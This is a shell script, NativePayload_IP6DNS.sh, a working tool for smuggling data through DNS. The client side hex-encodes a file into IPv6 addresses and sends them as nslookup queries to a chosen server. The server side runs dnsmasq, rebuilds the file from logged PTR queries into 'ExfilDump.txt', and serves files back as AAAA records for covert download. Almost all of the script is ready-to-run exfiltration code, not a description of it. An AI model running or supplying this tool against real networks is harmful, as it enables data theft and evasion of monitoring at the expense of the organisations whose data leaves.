 #!/bin/sh
echo
echo "NativePayload_IP6DNS.sh , Published by Damon Mohammadbagher 2017-2018" 
echo "Injecting/Downloading/Uploading DATA to DNS Traffic via IPv6 DNS AAAA/PTR Records"
echo "help syntax: ./NativePayload_IP6DNS.sh help"
echo
	if [ $1 == "help" ] 
	then
	tput setaf 2;
	echo
	echo "Example A-Step1: (Server Side ) ./NativePayload_IP6DNS.sh -r"
	echo "Example A-Step2: (Client Side ) ./NativePayload_IP6DNS.sh -u text.txt DNSMASQ_IPv4 [delay] (sec) [address] xxxx:xxxx"
	echo "example IPv4:192.168.56.110 : ./NativePayload_IP6DNS.sh -r"
	echo "example IPv4:192.168.56.111 : ./NativePayload_IP6DNS.sh -u text.txt 192.168.56.110 delay 0 address fe81:2222"
	echo "Description: with A-Step1 you will make DNS Server , with A-Step2 you can Send text file via IPv6 PTR Queries to DNS server"
	echo
	echo "Example B-Step1: (Server Side ) ./NativePayload_IP6DNS.sh -d makedns test.txt mydomain.com [address] xxxx:xxxx"
	echo "Example B-Step2: (Client Side ) ./NativePayload_IP6DNS.sh -d getdata mydomain.com DNSMASQ_IPv4"
	echo "example IPv4:192.168.56.110 : ./NativePayload_IP6DNS.sh -d makedns text.txt google.com address fe80:1234"
	echo "example IPv4:192.168.56.111 : ./NativePayload_IP6DNS.sh -d getdata google.com 192.168.56.110"
	echo "Description: with B-Step1 you will have DNS Server , with B-Step2 you can Dump test.txt file from server via IPv6 AAAA record Query"
	echo
	fi

	# uploading data via PTR queries (Client Side "A")
	if [ $1 == "-u" ] 
	then
		###########
		DefAddr="fe80:1111"
		if [ $6 == "address" ] 
			then
			DefAddr=$7
			elif [ $6 == null ]
			then
			DefAddr="fe80:1111"
		fi
		delaytime=0
		if [ $4 == "delay" ] 
			then
			delaytime=$5
			elif [ $4 == null ]
			then
			delaytime=0
		fi

		c=0		
		octets=""
		tput setaf 9;
		#echo " " > DnsHost.txt
		#echo " " > TempDnsHost.txt
		RecordsIDcounter=0
		IPv6Oct=0
		counts=0
	echo
	tput setaf 9;
	echo "[!] [Exfil/Uploading DATA] via IPv6 DNS PTR Record Queries"
	echo "[!] Sending DNS Lookup to DNS Server: " $3
	echo "[!] Sending DNS Lookup by Delay (sec): " $delaytime
	tput setaf 2;	
	echo
			for op in `xxd -p -c 1 $2`; do

			#echo "[!] injecting this text via IPv6 octet:" "`echo $op | xxd -r -p`" " ==byte==> " $op 

			if (($IPv6Oct == 0))
				then
				octets+=$op
				((IPv6Oct++))
				elif (($IPv6Oct == 1)) 
				then
				octets+=$op":"
				IPv6Oct=0				
				#debug only
				#echo "[!] injecting this text via IPv6 octet:" "`echo $octets | xxd -r -p`" " ==byte==> " $octets 
				#debug only
			fi			
			((c++))
				if(($c == 12))
				then
				tput setaf 2;				
				echo --------------------------
				tput setaf 3;				
				echo "[!] Your IPv6 is : " $DefAddr:"${octets::-1}"
				Data="${octets::-1}"
				tput setaf 6;
				echo "[!] Your Text/Data for this IPv6 is : " `echo $Data | xxd -r -p `
				#echo $DefAddr:"${octets::-1}":$RecordsIDcounter $4 >> TempDnsHost.txt
				time=`date '+%d/%m/%y %H:%M:%S'`
				tput setaf 9;
				echo "[>] [$counts] [$time] Sending Text/Data via Nslookup Done"
				MyIPv6address=$DefAddr:"${octets::-1}"
				nslookup -type=aaaa $MyIPv6address $3 | grep arpa
				tput setaf 2;	
				((counts++))
				sleep $delaytime
				tput setaf 9;
				octets=""
				c=0
				((RecordsIDcounter++))				
				else
				tput setaf 9;
				fi
			
			if(($RecordsIDcounter == 9999))
				then
				echo "[!] Oops Your IPv6 counter (z) was upper than 9999 : " "${octets::-1}".$RecordsIDcounter
				break
			fi
			done
		#########
	
	tput setaf 2;
	echo
	echo "[!] Sending Done by ($counts) Request."
	echo
	tput setaf 9;
	
	fi

	# download data via AAAA records queries
	if [ $1 == "-d" ] 
	then

	# Syntax : NativePayload_IP6DNS.sh -d getdata domain_name DnsMasq_IPv4" (CLIENT SIDE "B")
	if [ $2 == "getdata" ] 
	then

	tput setaf 9;	
	echo "[!] Downloading Mode , Dump Text DATA via DNS IPv6 AAAA Records "	
	tput setaf 2;	
	echo "[!] Sending DNS A Records Queries for Domain :" $3 "to DNSMASQ-Server:" $4
	echo "[!] to dump test.txt file via AAAA records you should use this syntax in server side:"
	tput setaf 9;
	echo "[!] Syntax : NativePayload_IP6DNS.sh -d makedns test.txt google.com"	

	# old ver : nslookup -type=aaaa google.com 127.0.0.1 | grep AAAA | awk {'print $5'}  | sort -t: -k 8 -n		
	PayloadLookups=`nslookup -type=aaaa $3  $4 | grep  AAAA | awk {'print $5'} | sort -t: -k 8 -n`
	
	# new ver : for some versions of nslookup you need this syntax
        if (( `echo ${#PayloadLookups}` == 0 )) 
	then
	PayloadLookups=`nslookup -type=aaaa $3  $4 | grep  Address: | awk {'print $2'} | sort -t: -k 8 -n`
	tput setaf 9;
	echo "[>] Warning , Nslookup Result via [grep AAAA] was null , Sending request again via [grep Address:]"
	echo "[!] Warning , it means Nslookup query sent (2) times"		
	fi

	tput setaf 9;
	echo "[>] Dumped this Text via DNS AAAA Record Query:"
	echo
	AAAARecordscounter=0

		for op in $PayloadLookups; do
		if [[ $op != *"#53"* ]];
		then
		Lookups+=`echo $op | cut -d':' -f3`
		Lookups+=`echo $op | cut -d':' -f4`
		Lookups+=`echo $op | cut -d':' -f5`
		Lookups+=`echo $op | cut -d':' -f6`
		Lookups+=`echo $op | cut -d':' -f7`
		echo $Lookups | xxd -r -p 
		Lookups=""
		((AAAARecordscounter++))		
		fi
		done

		echo
		echo
		tput setaf 2;	
		echo "[!] Dumping Done , Performed by" $((AAAARecordscounter)) "DNS AAAA Records for domain :" $3 "from Server:" $4
		echo
	fi

	# Creating DNS Server and DNSHOST.TXT file (SERVER SIDE "B")
	# NativePayload_IP6DNS.sh -d makedns text-file mydomain.com address fe80:1111
	if [ $2 == "makedns" ] 
	then	
		DefAddr="fe80:1111"
		if [ $5 == "address" ] 
			then
			DefAddr=$6
			elif [ $5 == null ]
			then
			DefAddr="fe80:1111"
		fi
		c=0		
		octets=""
		tput setaf 9;
		echo " " > DnsHost.txt
		echo " " > TempDnsHost.txt
		RecordsIDcounter=0
		IPv6Oct=0

			for op in `xxd -p -c 1 $3`; do

			#echo "[!] injecting this text via IPv6 octet:" "`echo $op | xxd -r -p`" " ==byte==> " $op 

			if (($IPv6Oct == 0))
				then
				octets+=$op
				((IPv6Oct++))
				elif (($IPv6Oct == 1)) 
				then
				octets+=$op":"
				IPv6Oct=0				
				# debug only	
				#echo "[!] injecting this text via IPv6 octet:" "`echo $octets | xxd -r -p`" " ==byte==> " $octets
				# debug only
				
			fi			
			((c++))
				if(($c == 10))
				then
				tput setaf 9;
				
				echo "[!] injecting this text via IPv6 Address (10bytes) :" "`echo $octets | xxd -r -p`" " ==byte==> " $octets				
				tput setaf 3;				
				echo "[!] Your IPv6 is : " $DefAddr:"${octets::-1}":$RecordsIDcounter
				Data="${octets::-1}"
				echo "[!] Your Text/Data for this IPv6 is : " `echo $Data | xxd -r -p `
				echo -------------------------
				echo $DefAddr:"${octets::-1}":$RecordsIDcounter $4 >> TempDnsHost.txt
				tput setaf 9;
				octets=""
				c=0
				((RecordsIDcounter++))				
				else
				tput setaf 9;
				fi
			
			if(($RecordsIDcounter == 9999))
				then
				echo "[!] Oops Your IPv6 counter (z) was upper than 9999 : " "${octets::-1}".$RecordsIDcounter
				break
			fi
			done

			echo
			tput setaf 2;
			echo "[!] DnsHost.txt Created by" $RecordsIDcounter "AAAA Records for Domain:" $4 
			echo "[!] you can use this DNSHOST.TXT file via Dnsmasq tool"
			tput setaf 2;
			echo "[!] to dump these AAAA records you should use this syntax in client side:"
			tput setaf 9;
			echo "[!] Syntax : NativePayload_IP6DNS.sh -d getdata domain_name DnsMasq_IPv4"
			echo
			echo "[>] DNSMASQ Started by DNSHOST.TXT File"
			echo
			tput setaf 9;
			# sort by -k4 : wxyz:wxyz:xxxx:XXXX:x:x:x:z
			cat TempDnsHost.txt | sort -t: -k4 -n > DnsHost.txt
			`dnsmasq --no-hosts --no-daemon --log-queries -H DnsHost.txt`
			tput setaf 9;


	fi

	fi	
	
	# make DNS Server for Dump DATA via DNS PTR Queries (Server Side "A")
	# Reading Mode (log data via dnsmasq log files)
	if [ $1 == "-r" ] 
	then
	tput setaf 9;
	echo "[>] Reading Mode , DNSMASQ Started by this log file : /var/log/dnsmasq.log !" 
	tput setaf 2;
	echo "" > /var/log/dnsmasq.log		
	`dnsmasq --no-hosts --no-daemon --log-queries --log-facility=/var/log/dnsmasq.log` &	
	filename="/var/log/dnsmasq.log"	
	fs=$(stat -c%s "$filename")
	count=0
	while true; do
		tput setaf 2;		
		sleep 10
		fs2=$(stat -c%s "$filename")
		if [ "$fs" != "$fs2" ] ; 
		then
		
		tput setaf 6;
		echo "[!] /var/log/dnsmasq.log File has changed!" 		
		echo "[!] Checking Queries"
		fs=$(stat -c%s "$filename")
		fs2=$(stat -c%s "$filename")

		IP6PTRecordsTemp=`cat  $filename | grep PTR | awk {'print $6'} | tr -d '.'`				
		time=`date '+%d/%m/%y %H:%M:%S'`	
		echo "[!] ["$time"] Dump this Text via IPv6 PTR Queries"
		
		tput setaf 9;
		Dumptext=""
		for ops1 in `echo $IP6PTRecordsTemp`; do
		
			IP6PTRecords=`echo "${ops1::-15}" | rev`
					
			echo $IP6PTRecords | xxd -r -p
			Dumptext+=`echo $IP6PTRecords | xxd -r -p` 
			done 
		echo
		tput setaf 6;
		echo "[>] this Text Saved to ExfilDump.txt"
		echo $Dumptext > ExfilDump.txt
		tput setaf 2;
		else
		fs=$(stat -c%s "$filename")
		fs2=$(stat -c%s "$filename")
		tput setaf 2;
		fi
	done
	fi
